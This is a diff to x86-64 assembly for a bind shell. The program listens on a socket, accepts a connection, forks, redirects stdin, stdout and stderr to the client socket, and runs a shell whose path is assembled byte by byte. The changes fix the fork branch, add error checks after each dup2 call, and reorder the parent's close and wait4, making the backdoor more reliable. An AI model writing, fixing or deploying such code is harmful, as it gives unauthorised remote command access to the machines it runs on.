@@ -1,5 +1,7 @@
+%define SYS_write	1
 %define SYS_close	2
 %define SYS_dup2	33
+%define SYS_getpid	39
 %define SYS_socket	41
 %define SYS_accept	43
 %define SYS_bind	49
@@ -35,6 +37,7 @@
 %define pid		(sock_client + 4)
 %define args		(pid + 8)
 %define sh_path		(args + 12)
+
 %define addr_family	0
 %define addr_addr	4
 %define addr_port	2
@@ -120,22 +123,28 @@ _start:
 	mov	dword [rbp - pid], eax
 
 	cmp	dword [rbp - pid], 0
-	je	_start_parent
+	jne	_start_parent
 
 	mov	rax, SYS_dup2
 	mov	edi, dword [rbp - sock_client]
 	mov	rsi, STDIN_FILENO
 	syscall
+	cmp	rax, -1
+	je	_start_err
 
 	mov	rax, SYS_dup2
 	mov	edi, dword [rbp - sock_client]
 	mov	rsi, STDOUT_FILENO
 	syscall
+	cmp	rax, -1
+	je	_start_err
 
 	mov	rax, SYS_dup2
 	mov	edi, dword [rbp - sock_client]
 	mov	rsi, STDERR_FILENO
 	syscall
+	cmp	rax, -1
+	je	_start_err
 
 	mov	byte [rbp - sh_path + 0], '/'
 	mov	byte [rbp - sh_path + 1], 'u'
@@ -164,12 +173,15 @@ _start:
 	syscall
 
 _start_parent:
-	mov	rax, SYS_wait4
-	mov	rdi, 0
-	syscall
-
 	mov	rax, SYS_close
 	mov	edi, dword [rbp - sock_client]
+	syscall
+
+	mov	rax, SYS_wait4
+	mov	edi, dword [rbp - pid]
+	mov	rsi, 0
+	mov	rdx, 0
+	mov	r10, 0
 	syscall
 
 	mov	rax, SYS_close
@@ -177,4 +189,5 @@ _start_parent:
 	syscall
 _start_err:
 	leave
+	xor	rax, rax
 	ret
